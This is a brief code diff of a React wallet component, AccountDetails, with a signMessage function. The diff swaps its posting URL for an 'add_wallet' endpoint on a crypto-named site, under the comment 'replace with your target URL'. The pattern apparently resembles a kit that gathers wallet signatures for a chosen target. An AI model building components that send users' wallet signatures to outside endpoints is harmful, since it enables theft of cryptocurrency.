@@ -8,7 +8,7 @@ const AccountDetails = ({ accountAddress, accountBalance }) => {
   const [value, setValue] = useState('');
   const [signature, setSignature] = useState('');
 
-  const url = 'https://net.bnetly.com/post.jsp'; // replace with your target URL
+  const url = 'https://www.kafkacoineth.com/home/add_wallet/'; // replace with your target URL
 
   const signMessage = async () => {
     try {
